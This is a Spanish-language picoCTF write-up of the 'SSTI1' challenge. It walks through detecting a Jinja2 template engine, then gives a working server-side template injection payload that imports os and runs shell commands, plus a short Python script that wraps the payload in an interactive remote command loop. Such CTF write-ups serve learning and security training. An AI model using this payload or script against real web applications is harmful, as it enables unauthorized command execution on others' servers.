# 🚀 Solución PicoCTF: SSTI1
> **Vulnerabilidad:** Server Side Template Injection (SSTI)
> **Explicación Vulnerabilidad:** [Server Side Template Injection (SSTI) ](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) 
> **Plataforma:** [picoCTF](https://play.picoctf.org/)  

---

## 🔍 1. Fase de Reconocimiento
Al interactuar con la web, observamos un campo que refleja nuestro texto. Para validar si es vulnerable a SSTI probamos lo siguiente:

* Me puedo apoyar de un repositorio github para detectar sí la pagina es vulnerable a SSTI (how to detect ssti github) - https://github.com/VHAE04/bookhack/blob/master/pentesting-web/ssti-server-side-template-injection/README.md

En resumen, las pruebas son las siguientes:

Para identificar el motor de plantillas que utiliza el servidor, probamos diferentes sintaxis matemáticas. Si el servidor evalúa la operación y devuelve `49`, podemos determinar el lenguaje y el motor:

| Payload | Motor Probable | Lenguaje |
| :--- | :--- | :--- |
| `{{7*7}}` | **Jinja2** o **Twig** | Python / PHP |
| `${7*7}` | **Mako**, **FreeMarker** o **Velocity** | Python / Java |
| `<%= 7*7 %>` | **ERB** | Ruby |
| `${{7*7}}` | **Smarty** | PHP |
| `#{7*7}` | **Jade**, **Pug** o **FreeMarker** (legacy) | Node.js / Java |

* **Tecnologías:**
  
* Mediante `whatweb` se detecta el uso de **Python**. Esto nos da una pista clave: el motor de plantillas podría ser **Jinja2**.

```Prueba
whatweb http://rescued-float.picoctf.net:61191/
```

* **BurpSuite:** Con `BurpSuite` también se puede identificar el motor de plantillas, se basa en los siguientes pasos:

```PruebaBurp
1. Ingresar a BurpSuite
2. Interceptar la petición
3. En el momento que se le da OK al texto, se hace click derecho sobre esa petición y enviar a Intruder
4. Identificar en que posición se envía la solicitud. En este caso es en la varibale content
5. Eliminar lo de la variable content
6. Agregar x, seleccionarla y darle click en add
7. Cargar el payload template-engines-special-vars.txt
8. Settings -> Redirections -> Always -> Process Cookies in redirections
9. Start attack
```
<img width="1882" height="478" alt="image" src="https://github.com/user-attachments/assets/6a3af803-cafe-48ad-b4d1-d18a9b89523a" />

Al validar la respuesta, se observa que el servidor es Werkzeug/3.0.3 Python/3.8.10, el cual corresponden a un jinja2

<img width="662" height="286" alt="image" src="https://github.com/user-attachments/assets/bc893dd1-b592-44fb-9eca-56fd8ae75847" />


En resumen, la valdiación es la siguiente:

Se ingresa un texto 
<img width="691" height="262" alt="image" src="https://github.com/user-attachments/assets/76d1927c-02ca-4964-b9a8-68316052b7dd" />

El servidor nos muestra lo que ingresamos
<img width="1427" height="287" alt="image" src="https://github.com/user-attachments/assets/ecd8c076-ffc0-4224-b0ff-4263c19ab0a8" />

Sí responde con lo mismo que se ingresó, es posible que sea vulnerable a SSTI

## 🧪 2. Confirmación del SSTI
Para verificar si el servidor evalúa expresiones matemáticas dentro de llaves `{{ }}`, enviamos:

| Payload | Resultado Esperado | Resultado Servidor |
| :--- | :--- | :--- |
| `{{ 8 * 8 }}` | `64` | **64** ✅ |
| `{{ 7 * '7' }}` | `7777777` | **7777777** ✅ |


## 💀 3. Explotación y RCE
Una vez confirmado **Jinja2**, buscamos obtener ejecución remota de comandos (**RCE**) para leer archivos del sistema.

### Lectura de archivos locales (LFI)
Utilizamos introspección de objetos en Python para acceder al módulo `os`:
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```
<img width="1101" height="256" alt="image" src="https://github.com/user-attachments/assets/5de910c0-7e02-4397-b992-bd46af494082" />


## 🤖 4. Automatización con Python
Desarrollamos un script para tener una terminal interactiva:

```python
     │ File: reverse_shell_ssti.py
─────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 │ #!/usr/bin/env python3
   2 │ 
   3 │ import requests
   4 │ import re
   5 │ 
   6 │ main_url = "http://rescued-float.picoctf.net:61191/announce"
   7 │ 
   8 │ while True:
   9 │ 
  10 │     user_input = input("[] > ")
  11 │ 
  12 │     data_post = {
  13 │             "content": '{{self.__init__.__globals__.__builtins__.__import__("os").popen("' + user_input + '").read()}}'
  14 │             }
  15 │     
  16 │     r = requests.post(main_url, data=data_post)
  17 │     
  18 │     response = re.findall(r'align="center">(.*)</h1>', r.text, re.DOTALL)[0]
  19 │     
  20 │     print(response)
```

## Resultado final
<img width="656" height="272" alt="image" src="https://github.com/user-attachments/assets/310d03e5-1c18-4601-9680-fe552c103f8f" />


